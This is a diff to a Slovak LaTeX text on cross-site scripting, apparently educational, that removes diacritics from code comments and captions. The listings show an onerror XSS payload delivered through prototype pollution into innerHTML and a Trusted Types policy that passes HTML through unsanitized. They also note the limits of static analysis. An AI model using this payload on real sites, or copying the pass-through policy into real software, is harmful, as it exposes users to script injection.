 \begin{lstlisting}[language=HTML, caption={XSS cez event handlery}, label={lst:xss-cez-event-handlery-60}]
 Object.prototype.html = '<img src=x onerror=alert(1)>';
 // Potom niekde inde:
-template.innerHTML = data.html; // Znečistenie prototypu
+template.innerHTML = data.html; // Znecistenie prototypu
 \end{lstlisting}
 
 \textbf{2022: DOM XSS cez obídenie dôveryhodných typov:}
-\begin{lstlisting}[language=HTML, caption={Príklad šablóny}, label={lst:pr-klad-abl-ny-61}]
-// Obídenie Dôveryhodných typov
+\begin{lstlisting}[language=HTML, caption={Priklad sablony}, label={lst:pr-klad-abl-ny-61}]
+// Obidenie Doveryhodnych typov
 trustedTypes.createPolicy('default', {
-  createHTML: (s) => s // Ups, žiadna dezinfekcia
+  createHTML: (s) => s // Ups, ziadna dezinfekcia
 });
 \end{lstlisting}
 
@@ -854,12 +861,12 @@ trustedTypes.createPolicy('default', {
 Automatizované testovanie XSS má obmedzenia:
 
 \begin{lstlisting}[language=JavaScript, caption={Funkcia na dezinfekciu vstupu}, label={lst:funkcia-na-dezinfekciu-vstupu-62}]
-// Statické analyzátory majú falošné pozitíva/negatíva
+// Staticke analyzatory maju falosne pozitiva/negativa
 const pouzivatelVstup = ziskajPouzivatelVstup();
 const bezpecne = dezinfikuj(pouzivatelVstup);
-element.innerHTML = bezpecne; // Je to bezpečné? Závisí od dezinfikuj()
+element.innerHTML = bezpecne; // Je to bezpecne? Zavisi od dezinfikuj()
 
-// Nástroje SAST nevedia, či dezinfikuj() je efektívna
+// Nastroje SAST nevedia, ci dezinfikuj() je efektivna
 \end{lstlisting}
 
 Dynamické testovanie (DAST) tiež zlyháva:
